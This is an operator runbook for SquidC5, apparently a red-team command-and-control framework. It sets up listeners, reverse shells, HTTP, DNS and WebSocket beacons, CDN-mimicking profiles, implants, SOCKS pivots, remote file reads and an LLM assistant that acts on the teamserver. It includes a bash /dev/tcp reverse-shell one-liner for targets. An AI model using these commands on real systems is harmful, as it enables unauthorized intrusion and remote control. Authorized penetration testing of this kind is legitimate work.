# SquidC5 Operator Runbook

**Command - Control - Cognitive - Collaborative - Coordination**

Authorized red team / pen-test use only.

How-to procedures for day-2 work. For feature reference (What / Why / How / Example), see the [User guide](user-guide.md). For install and prod binary deploy, see [Deployment](deployment.md).

| Related | Link |
|---------|------|
| User guide | [user-guide.md](user-guide.md) |
| Deployment | [deployment.md](deployment.md) |
| Full CLI | [AGENTS.md](../AGENTS.md) |
| Docs index | [README.md](README.md) |

---

## Prerequisites

### Goal

Install CLI tooling on the operator workstation.

### Prerequisites

- Python 3.11+
- Network path to the teamserver

### Steps

```bash
cd /path/to/squidc5
python3 -m venv .venv && source .venv/bin/activate
pip install -e .
```

Or use release binaries: `sc5-linux-x64` from [GitHub Releases](https://github.com/SquidSec/SquidC5/releases/latest).

### Verify

```bash
sc5 --help
```

### See also

- [User guide - CLI reference](user-guide.md#cli-reference)
- [Root README - Quick start](../README.md#quick-start-local)

---

## Connect CLI to a server

### Goal

Authenticate `sc5` against a running teamserver.

### Prerequisites

- Bootstrap or operator token (`data/admin_token.txt` on first start - never commit)
- Teamserver URL (HTTPS by default)

### Steps

```bash
sc5 login --url https://<HOST>:8443 --token sc5_... --insecure
sc5 health
sc5 whoami
```

Config stored at `~/.config/squidc5/config.json` (mode 0600). 
Use `--insecure` only for self-signed lab certs.

### Verify

```bash
sc5 health
# expect status ok
sc5 whoami
# expect scopes list
```

### If it fails

| Symptom | Check |
|---------|--------|
| TLS errors | `--insecure` or install CA; see [TLS](deployment.md#tls-https-default-on-new-instances) |
| 401 | Token wrong / revoked |
| Connection refused | Host/port, firewall, process up |

### See also

- [User guide - Connection](user-guide.md#connection)
- [Deployment - TLS](deployment.md#tls-https-default-on-new-instances)

---

## Reverse shell

### Goal

Capture a verified reverse shell and run a command.

### Prerequisites

- CLI logged in with `listeners:write`, `sessions:read`, `shell:interact`
- Target authorized under ROE; target can reach `HOST:PORT`

### Steps

```bash
sc5 listeners create rev-443 443 --kind reverse_shell
sc5 listeners start <listener_id>
sc5 payloads generate reverse_shell_bash <HOST> 443 --raw
```

On authorized target:

```bash
bash -c 'bash -i >& /dev/tcp/<HOST>/443 0>&1'
```

Operate:

```bash
sc5 sessions list --shells
sc5 shell <session_id> "whoami"
sc5 events
```

### Verify

- `sc5 listeners list` shows `running`
- Session `kind: reverse_shell` with `verified: true`
- `sc5 shell ... "whoami"` returns remote output

### If reverse shell fails

1. Listener `status` must be `running` (`sc5 listeners list`).
2. With Docker **bridge** networking, host must publish the port (`ports: ["443:443"]`).
3. With compose **host** networking, process binds host ports directly.
4. Ports &lt; 1024 need host sysctl: `net.ipv4.ip_unprivileged_port_start=0` (container is non-root).
5. Host firewall must allow the port.
6. Target must reach `<HOST>:<port>` (egress/NAT).
7. Flood of rejects on 443 is normal (scanners); false-shell filter drops noise.

### See also

- [User guide - Shell](user-guide.md#shell)
- [User guide - Listeners](user-guide.md#listeners)
- [Deployment - Privileged ports](deployment.md#privileged-ports)

---

## HTTP beacon

### Goal

Task an HTTP beacon implant.

### Prerequisites

- HTTP or HTTPS listener running (or beacons hitting API port per profile)
- Prefer active [C2 profile](#malleable-http-profiles) for HTTP shape

### Steps

```bash
sc5 payloads generate http_beacon_python <HOST> 8443 --raw
# run payload on authorized target
sc5 sessions list
sc5 tasks create <session_id> "id"
sc5 tasks list --session <session_id>
sc5 tasks get <task_id>
```

### Verify

- Session `kind: beacon` appears
- Task moves to completed with output after check-in

### If it fails

| Symptom | Check |
|---------|--------|
| No session | Wrong host/port/scheme; profile URI mismatch |
| Task stuck pending | Beacon sleep; listener down; profile change without regen |

### See also

- [User guide - Tasks](user-guide.md#tasks)
- [User guide - C2 profiles](user-guide.md#c2-profiles-profiles)

---

## Tokens

### Goal

Mint least-privilege tokens for operators or MCP.

### Prerequisites

- Admin or `tokens:manage` scope

### Steps

```bash
sc5 tokens create ops \
 --scopes "sessions:read,sessions:write,tasks:read,tasks:write,listeners:read,listeners:write,payloads:generate,metrics:read,audit:read"

sc5 tokens create ext-ai \
  --scopes "mcp:connect,sessions:read,tasks:read,tasks:write,metrics:read" \
  --mcp-tools "list_sessions,get_session,list_tasks,create_task,get_metrics"

# Update scopes without rotating the secret
sc5 tokens update <id> --scopes "sessions:read,shell:interact,metrics:read"
```

Raw `sc5_...` is shown **once** on create - store in a password manager. Ops Admin has named presets and Edit/Revoke on the token table. Nav hides pages the token cannot use.

### Verify

```bash
sc5 tokens list
sc5 login --url ... --token <new> --insecure && sc5 whoami
# Ops left nav should omit Profiles if profiles:read is missing
```

### See also

- [User guide - Tokens](user-guide.md#tokens)
- [User guide - MCP tools](user-guide.md#mcp-tools)


---

## INKO (Intelligent Neural Kinetic Operator)

### Goal

Use INKO chat to inspect and act on the live teamserver under rails.

### Prerequisites

- Token with `ai:use` or `admin`
- Optional: LLM configured ([User guide - LLM](user-guide.md#llm-connections))

### Steps

**Ops UI:**

1. Configure LLM under **Admin** (or `sc5 llm add ...`) - optional; offline intents still work.
2. Top-bar **INKO** -> right flyout (full screen on mobile). Nav **INKO** for full workspace + model switcher.
3. Pick connection and model. Enter sends; Shift+Enter newline. Escape / backdrop closes flyout.
4. Chat history is browser-local; tool calls are audited server-side (scopes + policy + HITL).

**CLI capabilities** (structured, not free-form chat):

```bash
sc5 ai recon_assist --data "windows domain host"
sc5 ai shell_classify --data "uid=0(root)"
sc5 ai payload_template --data "need bash http beacon"
sc5 llm list
sc5 llm add grok-prod grok-3 --provider xai --base-url https://api.x.ai/v1 --api-key "$XAI_KEY"
```

REST: `POST /api/v1/ai/chat`, `POST /api/v1/ai/run`, `GET /api/v1/ai/tools`, `GET /api/v1/ai/status`.

Example asks: *"list sessions"*, *"setup reverse shell listener on 4444"*, *"show recent events"*, *"save this payload as an artifact"*.

### Verify

- Flyout opens; offline or LLM reply returns
- Audit shows `ai.admin.chat` / tool events when tools run

### If it fails

| Symptom | Check |
|---------|--------|
| 403 | Missing `ai:use` |
| Offline-only | No LLM configured |
| Tool denied | Scope or HITL queue |

### See also

- [User guide - INKO](user-guide.md#inko-intelligent-neural-kinetic-operator)
- [User guide - LLM connections](user-guide.md#llm-connections)

---

## Observability

### Goal

Read metrics, audit, and live events.

### Prerequisites

- `metrics:read` / `audit:read` as needed

### Steps

```bash
sc5 metrics
sc5 audit --limit 50
sc5 audit-verify --limit 500
sc5 events
sc5 policy get
```

Ops -> **Observe**.

### Verify

- Metrics JSON returns counters
- `audit-verify` reports chain OK (or flags breaks)

### See also

- [User guide - Observability](user-guide.md#observability)

---

## Interactive mode

### Goal

Use the REPL for multi-command sessions.

### Prerequisites

- CLI configured (`sc5 login`)

### Steps

```bash
sc5 repl
```

### Verify

- Prompt accepts `health`, `sessions list`, etc.

### See also

- [User guide - CLI reference](user-guide.md#cli-reference)

---

## Malleable HTTP profiles

### Goal

Activate a profile and generate a matching HTTP beacon.

### Prerequisites

- `profiles:read` / `profiles:write` as needed
- HTTP/HTTPS listener up

### Steps

```bash
sc5 profiles list
sc5 profiles activate prof_amazon_cdn
sc5 payloads generate http_beacon_python <HOST> 8443 --profile prof_amazon_cdn --raw
# Implant posts to profile URIs with wrapped body
```

HTTPS via redirector:

```bash
sc5 payloads generate http_beacon_python <CDN_HOST> 443 --scheme https --raw
sc5 redirector --server-name cdn.example --uris /v1/telemetry,/api/v1/implant/beacon --raw
```

Ops -> **Profiles** -> activate -> **Payloads** -> generate.

Lab cert helper (host with certbot): `scripts/acme_lab_renew.sh` with `DOMAINS=... EMAIL=...`.

### Verify

- Beacon session appears after execution
- Tasks complete under the active profile

### If it fails

| Mistake | Result |
|---------|--------|
| Profile B active, implant built for A | No check-in |
| Redirector paths ≠ profile | Edge 404 |

### See also

- [User guide - C2 profiles](user-guide.md#c2-profiles-profiles)
- [User guide - Redirector](user-guide.md#redirector-and-certificates)

---

## DNS C2

### Goal

Run a DNS beacon against a DNS listener.

### Prerequisites

- DNS listener + zone; network path for DNS queries

### Steps

```bash
sc5 listeners create dns1 5353 --kind dns --zone c2.lab.invalid --host 0.0.0.0
sc5 listeners start <id>
sc5 payloads generate dns_beacon_python <DNS_HOST> 5353 --zone c2.lab.invalid --raw
```

### Verify

- Session appears; tasks complete after DNS check-ins

### See also

- [User guide - Listeners](user-guide.md#listeners)
- [OAST Collaborator](#oast-collaborator-http-dns-smtp) (related DNS path)

---

## OAST Collaborator (HTTP / DNS / SMTP)

### Goal

Mint OAST tokens and poll out-of-band hits.

### Prerequisites

- OAST zone and listeners configured - [Deployment - OAST](deployment.md#oast-collaborator-dns-http-smtp)
- CLI with access to teamserver

### Steps

```bash
sc5 --insecure login --url https://TEAM:8443 --token sc5_...

sc5 --insecure oast token create --note "sqli-oob"
# -> dns_name, http_url, smtp_to

sc5 --insecure oast tokens list
sc5 --insecure oast hits --token <TOKEN>
sc5 --insecure oast hits --token <TOKEN> --protocol dns
```

DNS listener config: `--zone oast.example.com --dns-mode both` (or `oast` / `beacon`). 
SMTP is log-only (feature `smtp_oast`, default off).

Point lab zone NS/records at the C2 host (**authorized lab only**; use *your* zone/IP - examples in deployment are illustrative).

### Verify

```bash
# after triggering callback from authorized test
sc5 --insecure oast hits --token <TOKEN>
# expect protocol rows
```

### If it fails

| Symptom | Check |
|---------|--------|
| No DNS hits | NS delegation, firewall 53/udp+tcp |
| No SMTP | Feature flag; provider blocks 25 - try 2525 |
| No HTTP | Listener on 80 running; public host correct |

### See also

- [User guide - OAST](user-guide.md#oast-collaborator)
- [Deployment - OAST](deployment.md#oast-collaborator-dns-http-smtp)

---

## WebSocket C2

### Goal

Generate and run a WebSocket beacon.

### Prerequisites

- Server WS path available; client has `websocket-client` if using Python template

### Steps

```bash
sc5 payloads generate ws_beacon_python <HOST> 8443 --raw
# optional TLS termination: --scheme wss and proxy wss to the server
```

Server path: `/ws/v1/beacon` (or WS profile path).

### Verify

- Beacon session appears; tasks complete

### See also

- [User guide - Payloads](user-guide.md#payloads-and-implants)

---

## Implants

### Goal

Build or generate implant families, including native sc5beacon.

### Prerequisites

- `payloads:generate` / implant scopes
- For native: Go toolchain or CI artifact; teamserver PSK

### Steps

```bash
sc5 implants families
sc5 implants build --os linux --arch amd64 C2_HOST 8443
sc5 implants generate dns_beacon <HOST> 5353 --raw
sc5 implants generate linux_memfd <HOST> 8443 --raw
sc5 implants generate bof <HOST> 8443 --platform windows --raw
```

### Native sc5beacon (preferred)

See [agents/sc5beacon/README.md](../agents/sc5beacon/README.md).

```bash
cd agents/sc5beacon && go build -o sc5beacon .
export SC5_URL="https://C2:8443/api/v1/implant/beacon"
export SC5_PSK="$(cat data/implant_psk.txt)" # from teamserver
./sc5beacon
```

Server must have `SQUIDC5_IMPLANT_REQUIRE_AUTH=true` (default) and matching PSK.

### Verify

- Session appears as authenticated beacon
- Optional: save build under Ops -> **Artifacts**

### See also

- [User guide - Payloads and implants](user-guide.md#payloads-and-implants)
- [User guide - Artifacts](user-guide.md#artifacts)

---

## SOCKS pivot

### Goal

Open a SOCKS5 pivot through an implant session.

### Prerequisites

- Live beacon session; appropriate scopes
- `SQUIDC5_PUBLIC_HOST` set when using reverse-dial from remote implants

### Steps

```bash
# Implant reverse-dial (default): needs live beacon session
curl -sk -X POST -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
 -d '{"session_id":"ses_...","mode":"implant","listen_host":"127.0.0.1"}' \
 https://C2:8443/api/v1/pivot/socks
# Point proxy tool at returned listen_port; implant handles socks:connect tasks

# Direct mode: C2 dials targets itself (lab only)
# mode=direct
```

Ops -> **Post-Ex** with session selected.

### Verify

- API returns listen host/port; proxy tool connects

### See also

- [User guide - Post-Ex](user-guide.md#post-ex)

---

## File ops

### Goal

List/read/write/delete files on a session.

### Prerequisites

- Session claimed if collab locks apply; scopes for file ops

### Steps

```bash
# POST /api/v1/files/op
# {"session_id":"...","op":"list","path":"/tmp"}
# {"session_id":"...","op":"read","path":"/etc/hosts","offset":0,"length":1024}
```

Ops -> **Post-Ex** / context rail.

### Verify

- JSON result with listing or chunk data

### See also

- [User guide - Post-Ex](user-guide.md#post-ex)

---

## Audit integrity

### Goal

Verify the audit hash chain.

### Prerequisites

- `audit:read`

### Steps

```bash
sc5 audit-verify --limit 500
```

### Verify

- Exit success / OK summary; investigate any break immediately

### See also

- [User guide - Observability](user-guide.md#observability)

---

## Teams and collab

### Goal

Coordinate multiple operators on shared sessions.

### Prerequisites

- Feature `collab_teams` as required; collab scopes

### Steps

```bash
sc5 teams create red-cell
sc5 teams members <team_id>
sc5 teams add-member <team_id> operator-b --role operator

# Claim / release (REST)
curl -sk -H "Authorization: Bearer $TOK" -X POST \
 "$URL/api/v1/sessions/$SID/claim"
curl -sk -H "Authorization: Bearer $TOK" -X POST \
 "$URL/api/v1/sessions/$SID/release"

# Handoff pack (transfers claim)
curl -sk -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
 -d '{"to":"operator-b","note":"your turn","include_pack":true}' \
 -X POST "$URL/api/v1/sessions/$SID/handoff"

# Spectator (read-only)
curl -sk -H "Authorization: Bearer $TOK" \
 "$URL/api/v1/sessions/$SID/spectator"

# Presence + team chat
curl -sk -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
 -d '{"status":"online","viewing_session":"'"$SID"'"}' \
 -X POST "$URL/api/v1/collab/presence"
curl -sk -H "Authorization: Bearer $TOK" "$URL/api/v1/collab/presence"
curl -sk -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
 -d '{"message":"standing by","team_id":"'"$TEAM"'"}' \
 -X POST "$URL/api/v1/collab/chat"

# My actions
curl -sk -H "Authorization: Bearer $TOK" "$URL/api/v1/audit/me?limit=50"
```

Ops -> **Collab**.

### Verify

- Second operator cannot shell without claim (non-admin)
- Handoff transfers claim; spectator is read-only

### See also

- [User guide - Multi-operator collab](user-guide.md#multi-operator-collab)

---

## AI chains

### Goal

Run a short allow-listed playbook chain (not open-ended agents).

### Prerequisites

- AI scopes; LLM if chain requires model

### Steps

```bash
sc5 playbooks
sc5 chain recon_then_classify --data "windows domain lab"
```

### Verify

- Chain completes with audited steps

### See also

- [User guide - INKO](user-guide.md#inko-intelligent-neural-kinetic-operator)
- [User guide - Policy](user-guide.md#policy)

---

## Report export

### Goal

Export an engagement report markdown.

### Prerequisites

- Metrics/audit scopes

### Steps

```bash
sc5 report --raw > engagement-report.md
```

### Verify

- File non-empty; review before sharing (authorized channels only)

### See also

- [User guide - Timeline and reports](user-guide.md#timeline-and-reports)
